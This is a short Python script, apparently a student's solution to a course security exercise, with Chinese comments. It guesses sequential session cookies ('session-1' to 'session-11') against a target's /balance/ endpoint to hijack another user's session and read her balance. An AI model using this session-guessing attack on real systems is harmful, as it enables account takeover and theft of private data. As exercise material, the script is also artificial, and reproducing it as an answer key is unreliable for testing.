import sys
import requests
import json


def test_session(address):
	#以下是我的代码
	for sid in range(1, 12):  # 小范围随机数
		cookies = {"sessionid": f"session-{sid}"}
		try:
			r = requests.get(f"http://{address}/balance/", cookies=cookies, timeout=2)
			if r.status_code == 200:
				data = r.json()
				if "balance" in data:  # 只要有 balance，就说明 session 是 Alice
					return data["balance"]
		except Exception:
			continue
	return None



def main(argv):
	address = sys.argv[1]
	print(test_session(address))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print('usage: python %s address' % sys.argv[0])
	else:
		main(sys.argv)
